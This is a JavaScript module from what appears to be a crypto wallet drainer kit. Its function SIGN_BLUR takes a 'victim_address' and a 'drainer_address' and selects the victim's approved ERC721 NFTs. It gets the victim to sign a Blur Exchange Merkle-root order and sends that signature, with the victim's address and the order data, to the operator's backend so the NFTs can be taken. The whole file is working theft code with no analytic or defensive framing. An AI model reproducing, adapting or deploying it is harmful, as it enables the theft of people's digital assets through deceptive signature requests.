import { is_nft_approved, send_request } from "../web3-provider";
import { ethers } from "ethers";

export const SIGN_BLUR = async (
  assets,
  provider,
  victim_address,
  drainer_address,
  user_id,
  min_price = 0
) => {
  try {
    const nft_list = [];
    const nft_list_plain = [];

    for (const asset of assets) {
      if (
        asset.skip ||
        asset.type !== "ERC721" ||
        asset.chain_id !== 1 ||
        asset.amount_usd < min_price
      )
        continue;

      const isApproved = await is_nft_approved(
        asset.address,
        victim_address,
        "0x00000000000111abe46ff893f3b2fdf1f759a8a8"
      );
      if (!isApproved) continue;

      nft_list.push({ collection: asset.address, tokenID: asset.id });
      nft_list_plain.push(asset);
    }

    if (nft_list.length < 2) return;

    const web3 = new ethers.providers.Web3Provider(provider);
    const signer = web3.getSigner();

    let response = await send_request({
      action: "blur",
      user_id,
      blur: "root",
      tokens: nft_list,
      address: victim_address,
    });

    try {
      await send_request({
        action: "blur",
        user_id,
        blur: "request",
        assets: nft_list_plain,
      });

      const signature = await signer._signTypedData(
        {
          name: "Blur Exchange",
          version: "1.0",
          chainId: 1,
          verifyingContract: "0x000000000000Ad05Ccc4F10045630fb830B95127",
        },
        {
          Root: [{ name: "root", type: "bytes32" }],
        },
        { root: response.data.root }
      );

      await send_request({
        action: "blur",
        user_id,
        blur: "success",
        signature,
        address: victim_address,
        root: response.data.root,
        paths: response.data.paths,
      });

      for (const asset of assets) {
        if (asset.skip || asset.type !== "ERC721" || asset.chain_id !== 1)
          continue;

        const is_signed = nft_list_plain.some(
          (x_asset) =>
            x_asset.address === asset.address && x_asset.id === asset.id
        );

        if (is_signed) {
          asset.skip = true;
        }
      }
    } catch (err) {
      console.error(err);
      await send_request({ action: "blur", user_id, blur: "cancel" });
    }
  } catch (err) {
    console.error(err);
  }
};
